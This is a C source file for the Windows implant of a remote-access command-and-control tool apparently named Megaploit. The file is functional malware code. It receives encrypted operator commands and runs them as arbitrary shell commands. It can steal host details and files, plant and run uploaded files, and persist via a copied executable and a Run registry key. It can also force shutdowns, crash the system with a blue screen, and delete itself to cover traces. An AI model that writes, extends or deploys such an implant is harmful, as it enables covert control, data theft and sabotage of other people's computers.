/*
 * client/shell.c  --  Shell command-loop for the Megaploit C2 protocol
 * ======================================================================
 * Receives encrypted commands from the C2, dispatches them through the
 * handler table below, and sends encrypted responses back.  Mirrors
 * megaploit/agent/handlers.py for shared verbs.
 *
 * Verb dispatch table
 * -------------------
 *  Each verb is matched with strncmp().  megaploit/core/c_probe.py scans
 *  these strncmp() calls at runtime to discover the full verb set without
 *  hardcoding any string in Python.
 *
 *  Shared verbs (Python agent + C client):
 *    exit              -- clean TLS disconnect (C2 sends "exit", not "q")
 *    q                 -- alias for exit (standalone serverShell compat)
 *    sysinfo           -- OS, hostname, username, arch, CWD
 *    cd <path>         -- SetCurrentDirectoryA
 *    upload <name>     -- receive framed file, write to disk, send "OK"
 *    download <path>   -- send "FILE_OK" then the framed file bytes
 *    persist <k> <f>   -- copy EXE to %APPDATA%\<f>, set HKCU Run key
 *    self_destruct     -- remove registry key, schedule EXE deletion, exit
 *
 *  C-exclusive verbs (auto-detected by c_probe; NOT in the Python agent):
 *    forceOff()        -- NtSetSystemPowerState + NtShutdownSystem
 *    blueScreen()      -- NtRaiseHardError(STATUS_ASSERTION_FAILURE) BSOD
 *
 *  Shell fallback:
 *    <anything else>   -- _popen() fallback; covers all remaining C2
 *                         commands sent as raw shell one-liners
 *
 * Adding a new C-exclusive command
 * ---------------------------------
 *  1. Implement a new handler function, e.g.:
 *       static void _handle_reboot(TLS_CONTEXT *pTls) { ... }
 *  2. Add a dispatch branch after the existing verbs:
 *       const char VERB[] = "reboot()";
 *       if (cbCmd >= sizeof(VERB)-1 && strncmp(VERB, cmd, sizeof(VERB)-1) == 0)
 *           { _handle_reboot(pTls); return; }
 *     The string you pass to strncmp() is the wire verb c_probe will detect.
 *  3. No Python changes needed -- c_probe.c_exclusive_verbs() detects it
 *     and commands.py auto-registers the operator command at startup.
 *
 * Protocol contract  (matches megaploit/core/protocol.py)
 * --------------------------------------------------------
 *  Every message:  [uint32-BE total_payload_len]
 *                  [12-byte random GCM nonce]
 *                  [AES-GCM ciphertext + 16-byte auth tag]
 *  Plaintext:      [uint64-BE seq][data bytes]
 *
 *  File transfers:
 *    "download <path>"  -->  client sends "FILE_OK" then one file frame
 *    "upload <name>"    -->  client receives one file frame, writes it
 *
 * Fixes vs. original Source.c
 * ----------------------------
 *  - "q" / "exit" both handled (C2 sends "exit"; serverShell.c sends "q")
 *  - fclose() on _popen() handle replaced with _pclose()
 *  - forceOff() strncmp length 11 -> 10
 *  - Empty output sends single-space sentinel so recv() does not block
 *  - NT status check logic corrected (0 = STATUS_SUCCESS = success)
 */

#include "shell.h"
#include "config.h"
#include "ntcalls.h"
#include "../tls/tls_client.h"   /* brings Windows.h + WIN32_LEAN_AND_MEAN */

/* Do NOT re-define WIN32_LEAN_AND_MEAN here — tls_client.h already did it.
 * Re-defining it after Windows.h has already been pulled in is harmless but
 * misleading; including winsock2.h explicitly after Windows.h would cause
 * winsock.h/winsock2.h redefinition warnings on some SDK versions.          */
#include <winsock2.h>   /* needed for WSACleanup() */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


/* ── Forward declarations ───────────────────────────────────────────────── */
static void _handle_sysinfo     (TLS_CONTEXT *pTls);
static void _handle_cd          (TLS_CONTEXT *pTls, const char *args);
static void _handle_upload      (TLS_CONTEXT *pTls, const char *filename);
static void _handle_download    (TLS_CONTEXT *pTls, const char *path);
static void _handle_persist     (TLS_CONTEXT *pTls, const char *args);
static void _handle_self_destruct(TLS_CONTEXT *pTls);
static void _send_str           (TLS_CONTEXT *pTls, const char *msg);
static void _shell_exec         (TLS_CONTEXT *pTls, const char *cmd);


/* ── Public: shell_run ──────────────────────────────────────────────────── */

void shell_run(TLS_CONTEXT *pTls)
{
    BYTE  *pCmd  = NULL;
    DWORD  cbCmd = 0;

    while (1) {
        if (pCmd) { free(pCmd); pCmd = NULL; cbCmd = 0; }

        /* Block until the next AES-GCM-decrypted, seq-verified command */
        if (!tls_recv_msg(pTls, &pCmd, &cbCmd))
            break;

        const char *cmd = (const char *)pCmd;

        /* ── "exit" — C2 standard disconnect ─────────────────────── */
        /* BUG: shell_run() must NOT call WSACleanup() — that is
         * main.c's responsibility.  Calling it here causes the Winsock
         * stack to be torn down while main.c still owns the socket,
         * which makes closesocket() in the reconnect loop fail silently.
         * tls_disconnect() is still correct here: it sends close_notify
         * and frees TLS buffers before control returns to main.c.       */
        if (cbCmd >= 4 && strncmp("exit", cmd, 4) == 0) {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }

        /* ── "q" — standalone serverShell.c compat ──────────────── */
        /* BUG: same WSACleanup() issue as "exit"; same fix.
         * cbCmd == 1 exact-length guard is correct (prevents matching
         * "quit", "queue", etc.).                                       */
        if (cbCmd == 1 && cmd[0] == 'q') {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }

        /* ── "sysinfo" ───────────────────────────────────────────── */
        if (cbCmd >= 7 && strncmp("sysinfo", cmd, 7) == 0) {
            free(pCmd); pCmd = NULL;
            _handle_sysinfo(pTls);
            continue;
        }

        /* ── "cd <path>" ─────────────────────────────────────────── */
        if (cbCmd >= 3 && strncmp("cd ", cmd, 3) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 3, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_cd(pTls, path);
            continue;
        }

        /* ── "upload <filename>" — receive a file from the C2 ───── */
        if (cbCmd >= 7 && strncmp("upload ", cmd, 7) == 0) {
            char filename[MAX_PATH] = {0};
            strncpy(filename, cmd + 7, sizeof(filename) - 1);
            free(pCmd); pCmd = NULL;
            _handle_upload(pTls, filename);
            continue;
        }

        /* ── "download <path>" — send a file to the C2 ──────────── */
        if (cbCmd >= 9 && strncmp("download ", cmd, 9) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 9, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_download(pTls, path);
            continue;
        }

        /* ── "persist <regkey> <filename>" ─────────────────────────*/
        if (cbCmd >= 8 && strncmp("persist ", cmd, 8) == 0) {
            char args[512] = {0};
            strncpy(args, cmd + 8, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_persist(pTls, args);
            continue;
        }

        /* ── "self_destruct" ─────────────────────────────────────── */
        if (cbCmd >= 13 && strncmp("self_destruct", cmd, 13) == 0) {
            free(pCmd); pCmd = NULL;
            _handle_self_destruct(pTls);
            return; /* process exits inside */
        }

        /* ── "forceOff()" — NtSetSystemPowerState ───────────────── */
        /* "forceOff()" = exactly 10 chars                           */
        if (cbCmd >= 10 && strncmp("forceOff()", cmd, 10) == 0) {
            free(pCmd); pCmd = NULL;
            NtSetSystemPowerState(PowerActionShutdownOff,
                                  PowerSystemShutdown,
                                  SHTDN_REASON_MAJOR_HARDWARE |
                                  SHTDN_REASON_MINOR_POWER_SUPPLY);
            NtShutdownSystem(ShutdownPowerOff);
            return;
        }

        /* ── "blueScreen()" — NtRaiseHardError ──────────────────── */
        if (cbCmd >= 12 && strncmp("blueScreen()", cmd, 12) == 0) {
            free(pCmd); pCmd = NULL;
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL,
                             6, &g_hardErrorResponse);
            continue;
        }

        /* ── Shell fallback — covers all remaining C2 commands ──── */
        /* Copies cmd before freeing pCmd so _shell_exec gets a valid ptr */
        char *cmdCopy = (char *)malloc(cbCmd + 1);
        if (cmdCopy) {
            memcpy(cmdCopy, cmd, cbCmd);
            cmdCopy[cbCmd] = '\0';
        }
        free(pCmd); pCmd = NULL;

        if (cmdCopy) {
            _shell_exec(pTls, cmdCopy);
            free(cmdCopy);
        }
    }

    if (pCmd) free(pCmd);
}


/* ── _send_str — convenience wrapper ───────────────────────────────────── */

static void _send_str(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg) msg = "";
    size_t len = strlen(msg);
    if (len > 0)
        tls_send_msg(pTls, (const BYTE *)msg, (DWORD)len);
    else
        tls_send_msg(pTls, (const BYTE *)" ", 1); /* sentinel — never send 0 bytes */
}


/* ── _handle_sysinfo ────────────────────────────────────────────────────── */
/*  Mirrors megaploit/agent/handlers.py  _sysinfo()                          */

static void _handle_sysinfo(TLS_CONTEXT *pTls)
{
    char  hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD cbHost = sizeof(hostname);
    GetComputerNameA(hostname, &cbHost);

    char username[256] = {0};
    DWORD cbUser = sizeof(username);
    GetUserNameA(username, &cbUser);

    char cwd[MAX_PATH] = {0};
    GetCurrentDirectoryA(sizeof(cwd), cwd);

    /* OS version via RtlGetVersion (GetVersionEx is deprecated) */
    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef NTSTATUS (WINAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    RtlGetVersion_t pRtlGetVersion =
        (RtlGetVersion_t)(hNtdll ? GetProcAddress(hNtdll, "RtlGetVersion") : NULL);
    if (pRtlGetVersion)
        pRtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    /* Architecture */
    SYSTEM_INFO si = {0};
    GetNativeSystemInfo(&si);
    const char *arch = "x86";
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        arch = "x64";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64)
        arch = "ARM64";

    /* BUG: 1024 bytes is too small when hostname + username + cwd are long.
     * e.g. "Windows 10.0 (Build 19045)\n" + MAX_COMPUTERNAME_LENGTH(15) +
     * UNLEN(256) + MAX_PATH(260) + arch(5) + format overhead = ~700 chars
     * in the worst case — but GetCurrentDirectory can return up to 32767
     * chars on modern Windows (with long-path support enabled).
     * Use a 4 KB stack buffer; the message is still bounded by the
     * field widths above (MAX_PATH + UNLEN + MAX_COMPUTERNAME_LENGTH).  */
    char buf[4096] = {0};
    _snprintf(buf, sizeof(buf) - 1,
        "[*] System Information\n"
        "    OS:           Windows %lu.%lu (Build %lu)\n"
        "    Hostname:     %s\n"
        "    Username:     %s\n"
        "    Architecture: %s\n"
        "    CWD:          %s",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        hostname, username, arch, cwd);

    _send_str(pTls, buf);
}


/* ── _handle_cd ─────────────────────────────────────────────────────────── */

static void _handle_cd(TLS_CONTEXT *pTls, const char *path)
{
    if (SetCurrentDirectoryA(path)) {
        char cwd[MAX_PATH] = {0};
        GetCurrentDirectoryA(sizeof(cwd), cwd);
        char buf[MAX_PATH + 16];
        _snprintf(buf, sizeof(buf) - 1, "[+] cwd: %s", cwd);
        _send_str(pTls, buf);
    } else {
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] Not found: %s", path);
        _send_str(pTls, buf);
    }
}


/* ── _handle_upload ─────────────────────────────────────────────────────── */
/*  C2 server sends: "upload <filename>"  then immediately sends a framed     */
/*  file message.  Client receives the file and writes it to disk.            */
/*  Mirrors megaploit/agent/handlers.py  _upload()                            */

static void _handle_upload(TLS_CONTEXT *pTls, const char *filename)
{
    /* The next message on the wire IS the file bytes (raw, framed) */
    BYTE  *pData = NULL;
    DWORD  cbData = 0;

    if (!tls_recv_msg(pTls, &pData, &cbData)) {
        _send_str(pTls, "[-] Receive failed: connection lost");
        return;
    }

    FILE *f = fopen(filename, "wb");
    if (!f) {
        free(pData);
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] Cannot open for writing: %s", filename);
        _send_str(pTls, buf);
        return;
    }
    /* FIX: check fwrite return — a partial write (e.g. disk full) must be
     * reported as an error rather than silently sending a success message. */
    size_t nWritten = fwrite(pData, 1, cbData, f);
    fclose(f);
    free(pData);

    char buf[MAX_PATH + 32];
    if (nWritten != (size_t)cbData) {
        _snprintf(buf, sizeof(buf) - 1, "[-] Write error: %s (wrote %zu of %lu bytes)",
                  filename, nWritten, (unsigned long)cbData);
    } else {
        _snprintf(buf, sizeof(buf) - 1, "[+] Received: %s (%lu bytes)", filename,
                  (unsigned long)cbData);
    }
    _send_str(pTls, buf);
}


/* ── _handle_download ────────────────────────────────────────────────────── */
/*  Client sends "FILE_OK" then the raw file bytes as a framed message.       */
/*  Mirrors megaploit/agent/handlers.py  _download()                          */

static void _handle_download(TLS_CONTEXT *pTls, const char *path)
{
    /* Check file exists */
    FILE *f = fopen(path, "rb");
    if (!f) {
        /* Send a non-FILE_OK message so the server's _recv_file_or_err fails */
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] File not found: %s", path);
        _send_str(pTls, buf);
        return;
    }

    /* Read entire file into memory */
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (sz <= 0 || sz > (long)(256 * 1024 * 1024)) {
        fclose(f);
        _send_str(pTls, "[-] File too large or empty");
        return;
    }

    BYTE *buf = (BYTE *)malloc((size_t)sz);
    if (!buf) {
        fclose(f);
        _send_str(pTls, "[-] Out of memory");
        return;
    }
    /* FIX: check fread return — partial reads must be treated as errors */
    size_t nRead = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    if (nRead != (size_t)sz) {
        free(buf);
        _send_str(pTls, "[-] File read error");
        return;
    }

    /* Protocol: send "FILE_OK" first, then the file bytes */
    _send_str(pTls, "FILE_OK");
    tls_send_msg(pTls, buf, (DWORD)sz);
    free(buf);
}


/* ── _handle_persist ─────────────────────────────────────────────────────── */
/*  Copies this EXE to APPDATA\<filename> and sets a HKCU Run registry key.   */
/*  Mirrors megaploit/agent/handlers.py  _persist()                           */
/*  Usage: persist <regkey_name> <filename>                                   */

static void _handle_persist(TLS_CONTEXT *pTls, const char *args)
{
    /* Split "regkey filename" */
    char regkey[256]  = {0};
    char filename[256]= {0};
    if (sscanf(args, "%255s %255s", regkey, filename) != 2) {
        _send_str(pTls, "Usage: persist <regkey> <filename>");
        return;
    }

    /* Destination: %APPDATA%\<filename> */
    char appdata[MAX_PATH] = {0};
    if (!GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata))) {
        _send_str(pTls, "[-] APPDATA not set");
        return;
    }

    char dst[MAX_PATH] = {0};
    _snprintf(dst, sizeof(dst) - 1, "%s\\%s", appdata, filename);

    /* Source: this process's EXE */
    char src[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, src, sizeof(src));

    if (GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES) {
        _send_str(pTls, "[-] Already exists");
        return;
    }

    if (!CopyFileA(src, dst, TRUE)) {
        _send_str(pTls, "[-] CopyFile failed");
        return;
    }

    /* Write HKCU\...\Run\<regkey> = <dst> */
    char regPath[512];
    _snprintf(regPath, sizeof(regPath) - 1,
        "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" "
        "/v \"%s\" /t REG_SZ /d \"%s\" /f", regkey, dst);

    system(regPath);
    _send_str(pTls, "[+] Persistence installed");
}


/* ── _handle_self_destruct ──────────────────────────────────────────────── */
/*  Removes registry run key, deletes this EXE, exits.                       */
/*  Mirrors megaploit/agent/handlers.py  _self_destruct()                    */

static void _handle_self_destruct(TLS_CONTEXT *pTls)
{
    /* 1. Remove registry key */
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /f >nul 2>&1");

    /* 2. Get our own EXE path */
    char exePath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exePath, sizeof(exePath));

    /* 3. Send the response before we die */
    _send_str(pTls, "[+] Registry run key removed\n[*] Self-destruct complete — terminating.");

    /* 4. Schedule deletion of our EXE via a cmd.exe one-shot and exit.
     *    We can't delete ourselves while running, so we use a batch trick. */
    char bat[MAX_PATH + 64];
    _snprintf(bat, sizeof(bat) - 1,
        "cmd.exe /c ping 127.0.0.1 -n 2 >nul & del /f /q \"%s\"", exePath);
    WinExec(bat, SW_HIDE);

    tls_disconnect(pTls);
    WSACleanup();
    ExitProcess(0);
}


/* ── _shell_exec — generic _popen fallback ───────────────────────────────── */
/*  Used for every C2 command not explicitly handled above.                   */
/*  FIX: uses _pclose (not fclose) for the _popen handle.                     */

static void _shell_exec(TLS_CONTEXT *pTls, const char *cmd)
{
    char   line[SHELL_LINE_BUF];
    char  *resp = (char *)calloc(1, SHELL_RESP_BUF);
    if (!resp) {
        _send_str(pTls, "[-] out of memory");
        return;
    }

    FILE *pFile = _popen(cmd, "r");
    if (pFile) {
        while (fgets(line, sizeof(line), pFile) != NULL) {
            size_t used = strlen(resp);
            size_t add  = strlen(line);
            if (used + add < (size_t)(SHELL_RESP_BUF - 1))
                memcpy(resp + used, line, add + 1);
        }
        _pclose(pFile); /* FIX: was fclose — undefined behaviour on popen handle */
    }

    size_t cbOut = strlen(resp);
    if (cbOut > 0)
        tls_send_msg(pTls, (const BYTE *)resp, (DWORD)cbOut);
    else
        tls_send_msg(pTls, (const BYTE *)" ", 1); /* sentinel */

    free(resp);
}
